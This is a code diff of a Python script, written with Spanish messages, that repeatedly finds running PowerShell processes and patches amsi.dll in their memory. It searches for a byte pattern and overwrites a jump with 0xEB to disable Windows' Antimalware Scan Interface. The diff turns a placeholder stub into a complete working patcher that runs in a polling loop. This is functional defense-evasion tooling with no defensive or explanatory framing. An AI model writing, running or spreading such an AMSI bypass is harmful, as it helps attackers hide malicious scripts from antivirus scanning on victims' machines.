@@ -1,5 +1,6 @@
 import ctypes
 import time
+import psutil
 from ctypes import wintypes
 
 const = {
@@ -7,7 +8,7 @@ const = {
     "vmread": 0x0010,
     "vmwrite": 0x0020,
     "th32snapproc": 0x2,
-    "ptchdrq": 500
+    "ptchdrq": 5000 
 }
 
 patch = bytes([0xEB])
@@ -26,7 +27,6 @@ class PROCESSENTRY32(ctypes.Structure):
         ('szExeFile', ctypes.c_char * wintypes.MAX_PATH)
     ]
 
-
 class MODULEENTRY32(ctypes.Structure):
     _fields_ = [
         ('dwSize', wintypes.DWORD),
@@ -40,7 +40,6 @@ class MODULEENTRY32(ctypes.Structure):
         ('szModule', ctypes.c_char * 256),
         ('szExePath', ctypes.c_char * wintypes.MAX_PATH)
     ]
-
 
 def get_module_base_address(pid, module_name):
     hModuleSnap = ctypes.windll.kernel32.CreateToolhelp32Snapshot(0x00000008, pid)
@@ -62,83 +61,74 @@ def get_module_base_address(pid, module_name):
     ctypes.windll.kernel32.CloseHandle(hModuleSnap)
     return None
 
-
 def SPatt(startaddr, pattern):
     patsiz = len(pattern)
     for i in range(len(startaddr)):
         if startaddr[i] == pattern[0]:
             j = 1
-            while j < patsiz and (pattern[j] == '?' or startaddr[i+j] == pattern[j]):
+            while j < patsiz and (pattern[j] == '?' or startaddr[i + j] == pattern[j]):
                 j += 1
             if j == patsiz:
                 return i
     return -1
 
-
-def patchAmsi(tpid):
+def PatchProcess(pid):
     pattern = bytes([0x48, 0x85, 0xD2, 0x74, 0x3F, 0x48, 0x85, 0xC9, 0x74, 0x3A, 0x48, 0x83, 0x79, 0x08, 0x00, 0x74, 0x33])
+    patch = bytes([0xEB]) 
 
-    base_address = get_module_base_address(tpid, "amsi.dll")
+    base_address = get_module_base_address(pid, "amsi.dll")
     if not base_address:
-        print(f"No se pudo obtener la dirección base de amsi.dll en el proceso {tpid}")
+        print(f"No se pudo obtener la dirección base de amsi.dll en el proceso {pid}")
         return -1
 
-    print(f"Dirección base de amsi.dll: {base_address}")
+    base_address_value = base_address.contents.value if isinstance(base_address, ctypes.POINTER(ctypes.c_byte)) else base_address
 
-    size = 0x10000  
+    print(f"Dirección base de amsi.dll en el proceso {pid}: {base_address_value}")
 
     prochandl = ctypes.windll.kernel32.OpenProcess(
-        ctypes.wintypes.DWORD(const["vmoperation"] | const["vmread"] | const["vmwrite"]),
-        False, tpid
+        const["vmoperation"] | const["vmread"] | const["vmwrite"],
+        False, pid
     )
+    if not prochandl:
+        print(f"No se pudo abrir el proceso {pid}. Error: {ctypes.windll.kernel32.GetLastError()}")
+        return -1
 
+    # Leer bloques de 4 KB
+    size = 0x1000
     buffer = ctypes.create_string_buffer(size)
     bytesRead = ctypes.c_size_t(0)
 
-    if not ctypes.windll.kernel32.ReadProcessMemory(prochandl, base_address, buffer, size, ctypes.byref(bytesRead)):
-        print(f"Error leyendo memoria en la dirección: {base_address}")
-        ctypes.windll.kernel32.CloseHandle(prochandl)
-        return -1
+    addr = ctypes.c_uint64(base_address_value)
+    total_size = 0x10000  
 
-    addr = SPatt(buffer.raw, pattern)
-    if addr == -1:
-        print("No se encontró el patrón.")
-        ctypes.windll.kernel32.CloseHandle(prochandl)
-        return -1
+    while total_size > 0:
+        if ctypes.windll.kernel32.ReadProcessMemory(prochandl, addr, buffer, size, ctypes.byref(bytesRead)):
+            pattern_offset = SPatt(buffer.raw, pattern)
+            if pattern_offset != -1:
+                patch_address = addr.value + pattern_offset + 3
+                print(f"Dirección a parchear: {patch_address}")
+                
+                written = ctypes.c_size_t(0)
+                if ctypes.windll.kernel32.WriteProcessMemory(prochandl, ctypes.c_uint64(patch_address), patch, len(patch), ctypes.byref(written)):
+                    print(f"Parche aplicado correctamente en el proceso {pid} en la dirección {patch_address}")
+                else:
+                    error_code = ctypes.windll.kernel32.GetLastError()
+                    print(f"Error aplicando el parche en el proceso {pid}. Error: {error_code}")
+
+                if bytesRead.value > 0:
+                    print(f"Se leyeron {bytesRead.value} bytes del proceso {pid}")
+                else:
+                    print(f"No se leyeron bytes del proceso {pid}, verifica que el parche se aplicó correctamente.")
+                break
+        else:
+            error_code = ctypes.windll.kernel32.GetLastError()
+            print(f"Error leyendo la memoria en la dirección {addr.value}. Error: {error_code}")
 
 
-    patch_address = ctypes.c_void_p(ctypes.addressof(base_address.contents) + addr + 3)
-    print(f"Dirección a parchear: {patch_address.value}")
+        addr.value += size
+        total_size -= size
 
-
-    written = ctypes.c_size_t(0)
-
-    if not ctypes.windll.kernel32.WriteProcessMemory(prochandl, patch_address, patch, len(patch), ctypes.byref(written)):
-        print("Error aplicando el parche.")
-        ctypes.windll.kernel32.CloseHandle(prochandl)
-        return -1
-
-
-def PatchAllPowershells(pn):
-    hSnap = ctypes.windll.kernel32.CreateToolhelp32Snapshot(const["th32snapproc"], 0)
-    pE = PROCESSENTRY32()
-    pE.dwSize = ctypes.sizeof(pE)
-
-    ctypes.windll.kernel32.Process32First(hSnap, ctypes.byref(pE))
-    while True:
-        if pE.szExeFile.decode('utf-8') == pn:
-            procId = pE.th32ProcessID
-            result = patchAmsi(procId)
-            if result == 0:
-                print(f"AMSI parcheado en el proceso {pE.th32ProcessID}")
-            else:
-                print("Falló el parcheo")
-        if not ctypes.windll.kernel32.Process32Next(hSnap, ctypes.byref(pE)):
-            break
-
-    ctypes.windll.kernel32.CloseHandle(hSnap)
-import psutil
-
+    ctypes.windll.kernel32.CloseHandle(prochandl)
 
 def is_amsi_loaded(proc):
     try:
@@ -149,19 +139,10 @@ def is_amsi_loaded(proc):
         pass
     return False
 
-def PatchProcess(pid):
-    print(f"Aplicando parche al proceso {pid}. (Implementa el parche aquí)")
-
-
-const = {
-    "ptchdrq": 5000 
-}
-
 patched_processes = set()
 
 def main():
     while True:
-
         for proc in psutil.process_iter(['pid', 'name']):
             if proc.info['name'].lower() == "powershell.exe":
                 pid = proc.info['pid']
@@ -169,11 +150,11 @@ def main():
                 if is_amsi_loaded(proc) and pid not in patched_processes:
                     print(f"amsi.dll está cargado en el proceso {pid}. Aplicando parche...")
                     PatchProcess(pid)
-                    patched_processes.add(pid) 
+                    patched_processes.add(pid)  
                 elif pid in patched_processes:
                     print(f"El proceso {pid} ya ha sido parcheado.")
 
-        time.sleep(const["ptchdrq"] / 1000)
+        time.sleep(const["ptchdrq"] / 1000) 
 
 if __name__ == "__main__":
     main()
